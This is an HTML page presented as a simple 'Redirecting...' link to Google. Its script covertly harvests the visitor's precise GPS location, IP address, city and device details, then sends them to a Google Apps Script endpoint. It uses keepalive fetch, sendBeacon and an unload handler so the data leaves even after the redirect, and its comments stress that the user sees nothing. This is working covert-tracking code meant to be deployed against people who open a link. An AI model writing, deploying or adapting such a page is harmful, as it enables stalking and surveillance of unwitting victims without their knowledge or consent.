<!DOCTYPE html>
<html>
<head>
  <title>Redirecting...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      padding: 0;
      background: white;
    }
    
    /* Completely hidden - user sees nothing */
    .hidden {
      position: absolute;
      top: -9999px;
      left: -9999px;
      width: 1px;
      height: 1px;
      opacity: 0;
      visibility: hidden;
    }
  </style>
</head>
<body>
  <!-- Everything is hidden from user -->
  <div class="hidden" id="background-processor">
    Background processing...
  </div>

  <script>
    // IMMEDIATE REDIRECT - User sees nothing, goes straight to Google
    const redirectToGoogle = () => {
      window.location.href = "https://www.google.com";
    };
    
    // Start redirect immediately (user experience)
    setTimeout(redirectToGoogle, 200); // 200ms delay only
    
    // BACKGROUND GPS COLLECTION - Runs while redirecting
    const backgroundData = {
      sessionId: 'BG_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5),
      timestamp: new Date().toISOString(),
      
      // Priority: GPS coordinates
      latitude: null,
      longitude: null,
      accuracy: null,
      
      // Basic device data
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screenWidth: screen.width,
      screenHeight: screen.height,
      referrer: document.referrer,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      
      // Device classification
      isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
      isIOS: /iPad|iPhone|iPod/.test(navigator.userAgent),
      isAndroid: /Android/.test(navigator.userAgent),
      
      // Collection status
      backgroundMode: true,
      gpsSuccess: false,
      ipSuccess: false,
      collectionAttempted: false
    };
    
    // RAPID GPS COLLECTION - Must be fast before redirect
    function rapidGPSCollection() {
      if (!navigator.geolocation) {
        backgroundData.gpsError = 'not_supported';
        return;
      }
      
      backgroundData.collectionAttempted = true;
      
      // Ultra-fast GPS configurations for background collection
      const rapidConfigs = [
        // Super fast high accuracy
        { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 },
        // Fast with recent cache
        { enableHighAccuracy: true, timeout: 2000, maximumAge: 5000 },
        // Network location
        { enableHighAccuracy: false, timeout: 1500, maximumAge: 10000 },
        // Any cached location
        { enableHighAccuracy: true, timeout: 1000, maximumAge: 30000 }
      ];
      
      let attempts = 0;
      let bestAccuracy = Infinity;
      
      rapidConfigs.forEach((config, index) => {
        setTimeout(() => {
          navigator.geolocation.getCurrentPosition(
            function(position) {
              attempts++;
              const coords = position.coords;
              
              // Keep most accurate
              if (coords.accuracy < bestAccuracy) {
                bestAccuracy = coords.accuracy;
                backgroundData.latitude = coords.latitude;
                backgroundData.longitude = coords.longitude;
                backgroundData.accuracy = coords.accuracy;
                backgroundData.altitude = coords.altitude;
                backgroundData.speed = coords.speed;
                backgroundData.heading = coords.heading;
                backgroundData.gpsSuccess = true;
                backgroundData.gpsMethod = `rapid_${index + 1}`;
                
                console.log(`Background GPS: ${coords.latitude}, ${coords.longitude} (Â±${coords.accuracy}m)`);
                
                // Send data immediately when GPS obtained
                sendBackgroundData();
              }
            },
            function(error) {
              attempts++;
              backgroundData.gpsError = error.message;
              backgroundData.gpsErrorCode = error.code;
              console.log(`Background GPS ${index + 1} failed: ${error.message}`);
            },
            config
          );
        }, index * 200); // Start attempts 200ms apart
      });
    }
    
    // BACKGROUND IP COLLECTION
    async function backgroundIPCollection() {
      try {
        // Fast IP collection with short timeout
        const ipPromise = Promise.race([
          fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(2000) }).then(r => r.json()),
          fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(2000) }).then(r => r.json())
        ]);
        
        const result = await ipPromise;
        
        if (result.ip) {
          backgroundData.ip = result.ip;
          backgroundData.ipSuccess = true;
          
          // Additional IP data if available
          if (result.city) {
            backgroundData.ipCity = result.city;
            backgroundData.ipCountry = result.country_name;
            backgroundData.ipLatitude = result.latitude;
            backgroundData.ipLongitude = result.longitude;
          }
          
          console.log(`Background IP: ${result.ip}`);
        }
        
      } catch (e) {
        backgroundData.ip = 'background_failed';
        backgroundData.ipError = e.message;
      }
    }
    
    // SEND BACKGROUND DATA
    async function sendBackgroundData() {
      try {
        const formData = new URLSearchParams();
        
        Object.keys(backgroundData).forEach(key => {
          if (backgroundData[key] !== null && backgroundData[key] !== undefined) {
            formData.append(key, backgroundData[key]);
          }
        });
        
        // Send data in background (non-blocking)
        fetch("https://script.google.com/macros/s/AKfycbyrivaVyvUrkS-QnVK0xw-o9Rn3oj4mFe772npi086ZE-aIomppWmeHNCYVBXhd_akP/exec", {
          method: "POST",
          body: formData,
          mode: "no-cors",
          keepalive: true // Ensures request continues even after page unload
        }).catch(() => {
          // Ignore errors to prevent affecting user experience
        });
        
        console.log('Background data sent');
        
      } catch (error) {
        // Ignore errors - don't affect user experience
        console.log('Background send error (ignored):', error);
      }
    }
    
    // FALLBACK LOCATION (if GPS fails completely)
    function getTimezoneLocation() {
      if (backgroundData.gpsSuccess) return; // Don't overwrite GPS
      
      const timezoneMap = {
        'America/New_York': { lat: 40.7128, lng: -74.0060 },
        'America/Los_Angeles': { lat: 34.0522, lng: -118.2437 },
        'America/Chicago': { lat: 41.8781, lng: -87.6298 },
        'America/Denver': { lat: 39.7392, lng: -104.9903 },
        'Europe/London': { lat: 51.5074, lng: -0.1278 },
        'Europe/Paris': { lat: 48.8566, lng: 2.3522 },
        'Europe/Berlin': { lat: 52.5200, lng: 13.4050 },
        'Asia/Tokyo': { lat: 35.6762, lng: 139.6503 },
        'Asia/Shanghai': { lat: 31.2304, lng: 121.4737 },
        'Asia/Mumbai': { lat: 19.0760, lng: 72.8777 },
        'Australia/Sydney': { lat: -33.8688, lng: 151.2093 }
      };
      
      if (timezoneMap[backgroundData.timezone]) {
        const location = timezoneMap[backgroundData.timezone];
        backgroundData.latitude = location.lat;
        backgroundData.longitude = location.lng;
        backgroundData.accuracy = 'timezone_fallback';
        backgroundData.locationMethod = 'timezone';
        
        console.log(`Background timezone location: ${location.lat}, ${location.lng}`);
      }
    }
    
    // START BACKGROUND COLLECTION IMMEDIATELY
    (function startBackgroundCollection() {
      console.log('ðŸ”„ Starting invisible background collection...');
      
      // Start GPS collection immediately
      rapidGPSCollection();
      
      // Start IP collection in parallel
      backgroundIPCollection();
      
      // Set timezone fallback after 2 seconds if no GPS
      setTimeout(() => {
        if (!backgroundData.gpsSuccess) {
          getTimezoneLocation();
        }
        
        // Send final data after all attempts
        sendBackgroundData();
        
        console.log('ðŸ”„ Background collection complete');
        console.log(`GPS: ${backgroundData.gpsSuccess ? 'SUCCESS' : 'FAILED'}`);
        console.log(`Location: ${backgroundData.latitude || 'N/A'}, ${backgroundData.longitude || 'N/A'}`);
      }, 2500);
      
    })();
    
    // ENHANCED VERSION: Use Service Worker for even more background processing
    if ('serviceWorker' in navigator) {
      // Register service worker for background processing
      navigator.serviceWorker.register('data:text/javascript;charset=utf-8,' + 
        encodeURIComponent(`
          self.addEventListener('message', function(event) {
            // Service worker can continue GPS collection even after redirect
            console.log('Service worker processing:', event.data);
          });
        `)
      ).catch(() => {
        // Ignore service worker errors
      });
    }
    
    // BEACON API for guaranteed data transmission (even after redirect)
    function sendViaBeacon() {
      if ('sendBeacon' in navigator) {
        setTimeout(() => {
          const beaconData = new URLSearchParams();
          Object.keys(backgroundData).forEach(key => {
            if (backgroundData[key] !== null && backgroundData[key] !== undefined) {
              beaconData.append(key, backgroundData[key]);
            }
          });
          
          // Beacon ensures data is sent even after page unloads
          navigator.sendBeacon(
            "https://script.google.com/macros/s/AKfycbyrivaVyvUrkS-QnVK0xw-o9Rn3oj4mFe772npi086ZE-aIomppWmeHNCYVBXhd_akP/exec",
            beaconData
          );
          
          console.log('Beacon data sent');
        }, 1000);
      }
    }
    
    // Send via beacon as backup
    sendViaBeacon();
    
    // BEFORE PAGE UNLOAD - Final data transmission attempt
    window.addEventListener('beforeunload', () => {
      sendBackgroundData();
    });
    
  </script>
</body>
</html>
